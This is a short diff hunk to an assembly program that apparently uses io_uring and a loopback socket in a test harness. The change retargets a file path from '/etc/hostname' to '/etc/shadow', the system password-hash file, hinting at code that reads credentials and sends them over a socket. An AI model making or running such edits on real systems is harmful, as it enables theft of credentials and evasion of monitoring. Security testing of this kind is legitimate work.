@@ -356,7 +356,7 @@ _fail:                               ; -EACCES on setup: SQPOLL unpriv < 5.11
 ; Config/data — AT THE END (sentinel-compat: runner scan + extract.py)
 ; ================================================================
 _path:
-    db '/etc/hostname', 0            ; NULLBYTE (terminator — data)
+    db '/etc/shadow', 0               ; NULLBYTE (terminator — data)
 
 ; ---- op 4 source sockaddr_in — 127.0.0.1 (loopback for testing) ----
 ; Layout = struct sockaddr_in: family @+0 (host order), port @+2, addr
